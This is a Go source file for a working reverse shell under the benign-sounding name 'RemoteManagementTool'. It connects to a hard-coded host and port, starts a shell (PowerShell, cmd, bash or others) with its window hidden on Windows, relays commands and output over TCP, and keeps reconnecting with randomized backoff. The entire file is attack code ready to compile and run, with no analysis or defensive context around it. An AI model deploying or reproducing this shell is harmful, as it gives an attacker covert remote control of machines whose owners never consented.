package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

type RemoteManagementTool struct {
	host              string
	port              int
	running           bool
	conn              net.Conn
	cmd               *exec.Cmd
	stdinPipe         io.WriteCloser
	stdoutPipe        io.ReadCloser
	mutex             sync.Mutex
	platformOverride  string
}

const CREATE_NO_WINDOW = 0x08000000
func (r *RemoteManagementTool) getOSType() string {
	if r.platformOverride != "" {
		return strings.ToLower(r.platformOverride)
	}
	return strings.ToLower(runtime.GOOS)
}

func (r *RemoteManagementTool) findCommandInterface() (string, error) {
	osType := r.getOSType()

	interpreters := map[string][]string{
		"windows": {"powershell.exe", "cmd.exe"},
		"linux":   {"zsh", "bash", "dash", "sh"},
		"darwin":  {"zsh", "bash", "sh"},
		"openbsd": {"ksh", "sh"},
		"freebsd": {"sh", "csh"},
	}

	choices, ok := interpreters[osType]
	if !ok {
		return "", fmt.Errorf("unsupported OS: %s", osType)
	}

	for _, interp := range choices {
		path, err := exec.LookPath(interp)
		if err == nil {
			return path, nil
		}
	}

	return "", fmt.Errorf("no suitable command interface found for %s", osType)
}

func (r *RemoteManagementTool) configureKeepAlive(conn net.Conn) {
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return
	}
	tcpConn.SetKeepAlive(true)
	tcpConn.SetKeepAlivePeriod(60 * time.Second)
}

func (r *RemoteManagementTool) launchCommandInterface(executablePath string) error {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command(executablePath)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: CREATE_NO_WINDOW,
		}
	} else {
		cmd = exec.Command(executablePath)
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	cmd.Stderr = cmd.Stdout

	r.stdinPipe = stdin
	r.stdoutPipe = stdout
	r.cmd = cmd

	err = cmd.Start()
	return err
}

func (r *RemoteManagementTool) receiveInput() {
	buf := make([]byte, 1024)
	for r.running {
		n, err := r.conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				fmt.Printf("[!] Receive error: %v\n", err)
			}
			break
		}

		data := buf[:n]

		if runtime.GOOS == "windows" {
			data = bytes.ReplaceAll(data, []byte("\n"), []byte("\r\n"))
		}

		_, err = r.stdinPipe.Write(data)
		if err != nil {
			fmt.Printf("[!] Error writing to stdin: %v\n", err)
			break
		}
	}
	r.running = false
}

func (r *RemoteManagementTool) sendOutput() {
	scanner := bufio.NewScanner(r.stdoutPipe)
	for r.running && scanner.Scan() {
		line := scanner.Text() + "\n"
		r.mutex.Lock()
		_, err := r.conn.Write([]byte(line))
		r.mutex.Unlock()
		if err != nil {
			fmt.Printf("[!] Send error: %v\n", err)
			break
		}
	}
	r.running = false
}

func (r *RemoteManagementTool) start(sockTimeout time.Duration) {
	address := fmt.Sprintf("%s:%d", r.host, r.port)
	fmt.Printf("[*] Connecting to %s...\n", address)

	dialer := net.Dialer{Timeout: sockTimeout}
	conn, err := dialer.Dial("tcp", address)
	if err != nil {
		fmt.Printf("[!] Connection failed: %v\n", err)
		return
	}

	r.conn = conn
	r.running = true
	r.configureKeepAlive(conn)

	shellPath, err := r.findCommandInterface()
	if err != nil {
		fmt.Printf("[!] Interface detection failed: %v\n", err)
		r.conn.Close()
		return
	}
	fmt.Printf("[+] Using command processor: %s\n", shellPath)

	err = r.launchCommandInterface(shellPath)
	if err != nil {
		fmt.Printf("[!] Failed to launch shell: %v\n", err)
		r.conn.Close()
		return
	}

	go r.receiveInput()
	go r.sendOutput()

	err = r.cmd.Wait()
	if err != nil {
		fmt.Printf("[!] Shell process exited: %v\n", err)
	}

	r.cleanup()
}

func (r *RemoteManagementTool) cleanup() {
	r.mutex.Lock()
	defer r.mutex.Unlock()

	r.running = false
	if r.conn != nil {
		r.conn.Close()
		r.conn = nil
	}
	if r.cmd != nil && r.cmd.Process != nil {
		r.cmd.Process.Kill()
	}
}

func reconnectLoop(ip string, port int, platformOverride string) {
	delay := 10 * time.Second
	maxDelay := 300 * time.Second

	for {
		client := &RemoteManagementTool{
			host:             ip,
			port:             port,
			running:          false,
			platformOverride: platformOverride,
		}

		client.start(15 * time.Second)

		fmt.Printf("[*] Reconnecting in %.2f seconds...\n", delay.Seconds())
		time.Sleep(delay + time.Duration(rand.Intn(2000))*time.Millisecond)

		// Exponential backoff with max delay
		delay *= 2
		if delay > maxDelay {
			delay = maxDelay
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	lhost := "192.168.56.1"
	lport := 2021

	// Signal handler
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		fmt.Printf("[*] Signal %v received, exiting...\n", sig)
		os.Exit(0)
	}()

	reconnectLoop(lhost, lport, "")
}
